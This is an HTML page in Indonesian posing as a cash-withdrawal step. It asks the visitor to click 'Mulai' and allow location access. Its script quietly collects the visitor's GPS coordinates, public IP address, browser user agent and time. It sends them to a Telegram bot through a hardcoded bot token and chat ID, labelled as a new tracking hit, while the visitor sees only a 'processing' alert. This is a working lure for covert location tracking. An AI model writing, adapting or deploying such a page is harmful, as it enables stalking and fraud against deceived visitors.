
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Penarikan Uang Tunai</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #f2f2f2;
      text-align: center;
      padding-top: 100px;
    }
    button {
      padding: 15px 30px;
      font-size: 18px;
      background-color: #28a745;
      color: white;
      border: none;
      border-radius: 5px;
      cursor: pointer;
    }
  </style>
</head>
<body>
  <h2>Penarikan Uang Tunai</h2>
  <p>Silakan klik tombol di bawah ini dan izinkan lokasi untuk melanjutkan proses penarikan.</p>
  <button onclick="mulaiPelacakan()">Mulai</button>

  <script>
    async function getIP() {
      try {
        const res = await fetch('https://api.ipify.org?format=json');
        const data = await res.json();
        return data.ip;
      } catch (e) {
        return "IP tidak ditemukan";
      }
    }

    function getUserAgent() {
      return navigator.userAgent;
    }

    function getTime() {
      return new Date().toLocaleString();
    }

    function kirimTelegram(pesan) {
      const token = "8069601328:AAFiHiIqe5ICmG6t4pIaal10JjNIM7QN7RM";
      const chat_id = "7932600874";
      const url = `https://api.telegram.org/bot${token}/sendMessage`;
      fetch(url, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: chat_id, text: pesan })
      });
    }

    function mulaiPelacakan() {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(async function(pos) {
          const ip = await getIP();
          const userAgent = getUserAgent();
          const time = getTime();
          const latitude = pos.coords.latitude;
          const longitude = pos.coords.longitude;

          const pesan = `üåê PELACAKAN BARU:
IP: ${ip}
Lokasi: https://maps.google.com/?q=${latitude},${longitude}
User-Agent: ${userAgent}
Waktu: ${time}`;

          kirimTelegram(pesan);
          alert("Permintaan sedang diproses...");
        }, function(error) {
          alert("Gagal mengambil lokasi: " + error.message);
        });
      } else {
        alert("Geolocation tidak didukung di perangkat ini.");
      }
    }
  </script>
</body>
</html>
